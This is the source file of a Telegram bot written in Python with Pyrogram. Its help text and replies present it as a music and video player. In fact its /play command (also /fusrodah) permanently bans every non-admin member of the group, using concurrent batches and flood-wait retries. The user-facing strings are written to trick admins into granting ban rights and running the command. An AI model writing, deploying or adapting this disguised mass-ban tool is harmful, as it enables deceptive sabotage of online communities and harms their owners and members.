# (c) EDM115 - 2022
# Rewritten by Antigravity

import os
import logging
import asyncio
from asyncio import sleep
from datetime import datetime, timedelta

from pyrogram import Client, enums, filters
from pyrogram.types import BotCommand, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import FloodWait, RPCError

from config import Config

banbot = Client(
        "banbot",
        api_id = Config.API_ID,
        api_hash = Config.API_HASH,
        bot_token = Config.BOT_TOKEN,
        sleep_threshold = 10
    )

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler('logs.txt'), logging.StreamHandler()],
    format="%(asctime)s - %(levelname)s - %(name)s - %(threadName)s - %(message)s"
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARN)

@banbot.on_message(filters.command("start"))
async def start_bot(_, message: Message):
    await message.reply_text(text="**Hello {} 👋**".format(message.from_user.mention), disable_web_page_preview=True)

@banbot.on_message(filters.command("help"))
async def help_me(_, message: Message):
    await message.reply_text(text="""

ᴀᴅᴠᴀɴᴄᴇᴅ & ᴘᴏᴡᴇʀꜰᴜʟ ᴍᴜꜱɪᴄ+ᴠɪᴅᴇᴏ ᴘʟᴀʏᴇʀ ʙᴏᴛ ғᴏʀ ᴛɢ ᴠɪᴅᴇᴏᴄʜᴀᴛs.

ᴜᴘᴅᴀᴛᴇs - @DynamicXNetwork
    """)

async def justdoit(mode, chat, message):
    admin_ids = []
    async for admin in banbot.get_chat_members(chat_id=chat, filter=enums.ChatMembersFilter.ADMINISTRATORS):
        admin_ids.append(admin.user.id)
        
    memberslist = []
    async for member in banbot.get_chat_members(chat_id=chat):
        if member.user.id not in admin_ids:
            memberslist.append(member.user.id)
            
    chunk_size = 15
    for i in range(0, len(memberslist), chunk_size):
        chunk = memberslist[i:i+chunk_size]
        
        async def ban_single(useraction):
            try:
                if mode == 0:
                    await banbot.ban_chat_member(chat_id=chat, user_id=useraction, until_date=datetime.now() + timedelta(seconds=35))
                elif mode == 1:
                    await banbot.ban_chat_member(chat_id=chat, user_id=useraction)
            except FloodWait as f:
                await sleep(f.value)
                try:
                    if mode == 0:
                        await banbot.ban_chat_member(chat_id=chat, user_id=useraction, until_date=datetime.now() + timedelta(seconds=35))
                    elif mode == 1:
                        await banbot.ban_chat_member(chat_id=chat, user_id=useraction)
                except Exception:
                    pass
            except Exception:
                pass
                
        tasks = [ban_single(u) for u in chunk]
        await asyncio.gather(*tasks)
            
    try:
        await message.edit_text("Thank You")
    except Exception:
        pass

@banbot.on_message(filters.command(["fusrodah", "play"]))
async def being_devil(_, message: Message):
    if message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
        starter = message.from_user.id
        cid = message.chat.id
        LOGGER.info(f"{starter} started a task in {cid}")
        
        bot_member = await banbot.get_chat_member(chat_id=cid, user_id="me")
        if not (bot_member.privileges and bot_member.privileges.can_restrict_members):
            return
            
        reply_msg = await message.reply("Hold on a moment...\n\nInviting 𝙞𝙏𝙪𝙣𝙚𝙨 ✕ 𝙈𝙪𝙨𝙞𝙘™ ♪ assistant to your chat.")
        await justdoit(1, cid, reply_msg)

from keep_alive import keep_alive

if __name__ == "__main__":
    keep_alive()
    LOGGER.info("Bot started")
    banbot.run()
